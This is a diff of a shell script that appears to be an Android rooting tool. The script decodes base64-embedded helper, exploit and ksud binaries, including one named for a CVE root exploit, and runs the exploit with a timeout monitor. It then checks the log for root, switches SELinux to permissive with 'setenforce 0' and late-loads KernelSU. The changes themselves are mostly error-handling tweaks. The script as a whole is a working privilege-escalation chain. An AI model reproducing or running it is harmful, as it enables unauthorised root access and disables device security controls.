@@ -77,31 +77,31 @@ get_profile() {
 extract_payloads() {
     info ""
     info "=== EXTRACTING PAYLOADS ==="
-    mkdir -p "$TEMP_DIR"
+    mkdir -p "$TEMP_DIR" 2>/dev/null || true
     
     # Create work directory
-    mkdir -p "$WORK_DIR"
+    mkdir -p "$WORK_DIR" 2>/dev/null || true
     
     # Helper binary (libcve43499root.so)
     info "Extracting helper..."
-    echo "$HELPER_B64" | base64 -d > "$HELPER_FILE" 2>/dev/null || fatal "Helper extraction failed"
+    echo "$HELPER_B64" | base64 -d > "$HELPER_FILE" || fatal "Helper extraction failed"
     chmod 755 "$HELPER_FILE"
-    [ -s "$HELPER_FILE" ] || fatal "Helper file is empty"
-    info "✓ Helper extracted ($(stat -f%z "$HELPER_FILE" 2>/dev/null || stat -c%s "$HELPER_FILE")  bytes)"
+    [ -s "$HELPER_FILE" ] || { fatal "Helper file is empty or extraction failed"; }
+    info "✓ Helper extracted"
     
     # Exploit binary
     info "Extracting exploit..."
-    echo "$EXPLOIT_B64" | base64 -d > "$EXPLOIT_FILE" 2>/dev/null || fatal "Exploit extraction failed"
+    echo "$EXPLOIT_B64" | base64 -d > "$EXPLOIT_FILE" || fatal "Exploit extraction failed"
     chmod 755 "$EXPLOIT_FILE"
-    [ -s "$EXPLOIT_FILE" ] || fatal "Exploit file is empty"
-    info "✓ Exploit extracted ($(stat -f%z "$EXPLOIT_FILE" 2>/dev/null || stat -c%s "$EXPLOIT_FILE") bytes)"
+    [ -s "$EXPLOIT_FILE" ] || { fatal "Exploit file is empty or extraction failed"; }
+    info "✓ Exploit extracted"
     
     # ksud binary
     info "Extracting ksud..."
-    echo "$KSUD_B64" | base64 -d > "$KSUD_FILE" 2>/dev/null || fatal "ksud extraction failed"
+    echo "$KSUD_B64" | base64 -d > "$KSUD_FILE" || fatal "ksud extraction failed"
     chmod 755 "$KSUD_FILE"
-    [ -s "$KSUD_FILE" ] || fatal "ksud file is empty"
-    info "✓ ksud extracted ($(stat -f%z "$KSUD_FILE" 2>/dev/null || stat -c%s "$KSUD_FILE") bytes)"
+    [ -s "$KSUD_FILE" ] || { fatal "ksud file is empty or extraction failed"; }
+    info "✓ ksud extracted"
 }
 
 # Execute exploit
@@ -117,26 +117,32 @@ execute_exploit() {
         *) fatal "Exploit cancelled" ;;
     esac
     
-    # Run exploit with timeout
+    # Run exploit with timeout (no timeout command on Android, use background + manual check)
     local start=$(date +%s)
-    timeout 1800 "$HELPER_FILE" --run-payload "$EXPLOIT_FILE" "$HELPER_FILE" "$EXPLOIT_LOG" 2>&1 &
+    "$HELPER_FILE" --run-payload "$EXPLOIT_FILE" "$HELPER_FILE" "$EXPLOIT_LOG" 2>&1 &
     local pid=$!
     
     # Monitor progress
-    while kill -0 $pid 2>/dev/null; do
+    while true; do
+        if ! kill -0 $pid 2>/dev/null; then
+            break
+        fi
         sleep 2
         if [ -f "$EXPLOIT_LOG" ]; then
             tail -1 "$EXPLOIT_LOG"
         fi
         
         local elapsed=$(($(date +%s) - start))
-        [ $elapsed -gt 1800 ] && { kill $pid 2>/dev/null; fatal "Exploit timeout"; }
+        if [ $elapsed -gt 1800 ]; then
+            kill $pid 2>/dev/null || true
+            fatal "Exploit timeout"
+        fi
     done
     
     wait $pid || fatal "Exploit failed (exit code $?)"
     
     # Verify success
-    if grep -q "done=1" "$EXPLOIT_LOG" && grep -q "root=1" "$EXPLOIT_LOG"; then
+    if grep -q "done=1" "$EXPLOIT_LOG" 2>/dev/null && grep -q "root=1" "$EXPLOIT_LOG" 2>/dev/null; then
         info "✓ Exploit successful"
         return 0
     fi
@@ -153,19 +159,19 @@ install_kernelsu() {
     info "KMI: $kmi"
     
     # Create directories
-    "$HELPER_FILE" -c "mkdir -p /data/adb && chmod 700 /data/adb" >/dev/null 2>&1 || true
+    "$HELPER_FILE" -c "mkdir -p /data/adb && chmod 700 /data/adb" 2>/dev/null || true
     
     # Set SELinux permissive
-    "$HELPER_FILE" -c "setenforce 0" >/dev/null 2>&1 || true
+    "$HELPER_FILE" -c "setenforce 0" 2>/dev/null || true
     
     # Stage and run ksud
-    "$HELPER_FILE" -c "chmod 755 $KSUD_FILE" >/dev/null 2>&1 || true
+    "$HELPER_FILE" -c "chmod 755 $KSUD_FILE" 2>/dev/null || true
     info "Running ksud late-load (KMI=$kmi)..."
-    "$HELPER_FILE" -c "$KSUD_FILE late-load --kmi $kmi" >/dev/null 2>&1 || true
+    "$HELPER_FILE" -c "$KSUD_FILE late-load --kmi $kmi" 2>/dev/null || true
     
     # Wait for module to load
     sleep 2
-    if "$HELPER_FILE" -c "test -e /dev/kernelsu" >/dev/null 2>&1; then
+    if "$HELPER_FILE" -c "test -e /dev/kernelsu" 2>/dev/null; then
         info "✓ KernelSU verified (/dev/kernelsu exists)"
         return 0
     fi
